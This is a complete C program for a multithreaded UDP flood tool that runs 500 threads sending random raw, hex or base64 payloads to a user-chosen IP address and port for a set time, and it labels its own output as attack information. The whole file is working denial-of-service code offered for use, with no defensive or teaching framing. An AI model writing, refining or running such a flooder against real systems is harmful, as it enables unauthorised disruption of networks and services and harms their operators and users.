#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <openssl/evp.h> // For base64 encoding

// Define the number of threads
#define NUM_THREADS 500

// Function to display usage information
void usage() {
    printf("Usage: ./udp_flood <ip> <port> <time>\n");
    exit(1);
}

// Structure to pass data to each thread
struct thread_data {
    char *ip;
    int port;
    int time;
};

// Function to generate a random payload of a given size
void generate_random_payload(unsigned char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        buffer[i] = rand() % 256; // Random byte
    }
}

// Function to convert data to hex string
void to_hex_string(const unsigned char *data, size_t size, char *output) {
    for (size_t i = 0; i < size; i++) {
        sprintf(output + (i * 2), "%02x", data[i]);
    }
}

// Function to encode data in base64
size_t base64_encode(const unsigned char *data, size_t size, char *output) {
    EVP_ENCODE_CTX *ctx = EVP_ENCODE_CTX_new();
    int out_len;
    size_t total_len = 0;

    EVP_EncodeInit(ctx);
    EVP_EncodeUpdate(ctx, (unsigned char *)output, &out_len, data, size);
    total_len += out_len;
    EVP_EncodeFinal(ctx, (unsigned char *)output + total_len, &out_len);
    total_len += out_len;

    EVP_ENCODE_CTX_free(ctx);
    return total_len;
}

// Function that each thread will execute to send packets
void *send_packets(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Calculate end time for the thread
    endtime = time(NULL) + data->time;

    // Seed random number generator
    srand(time(NULL) ^ pthread_self());

    // Keep sending packets until the specified time expires
    while (time(NULL) <= endtime) {
        // Generate a random payload size (between 64 and 512 bytes)
        size_t payload_size = 64 + (rand() % 449);
        unsigned char payload[payload_size];
        generate_random_payload(payload, payload_size);

        // Decide the format (33% bytes, 33% hex, 34% base64)
        int format = rand() % 100;
        char final_payload[payload_size * 2]; // Enough space for hex/base64

        if (format < 33) {
            // Send as raw bytes
            sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        } else if (format < 66) {
            // Convert to hex and send
            to_hex_string(payload, payload_size, final_payload);
            sendto(sock, final_payload, strlen(final_payload), 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        } else {
            // Convert to base64 and send
            size_t base64_len = base64_encode(payload, payload_size, final_payload);
            sendto(sock, final_payload, base64_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }

        // Sleep for a short time to avoid overwhelming the network
        usleep(1000); // 1 millisecond
    }

    // Close the socket after sending is done
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    // Parse the command-line arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    // Allocate memory for thread IDs
    pthread_t thread_ids[NUM_THREADS];
    struct thread_data data = {ip, port, time};

    // Print attack information
    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);

    // Create threads for sending packets
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Thread %lu created.\n", thread_ids[i]);
    }

    // Wait for all threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Print completion message
    printf("Packet sending finished.\n");
    return 0;
}
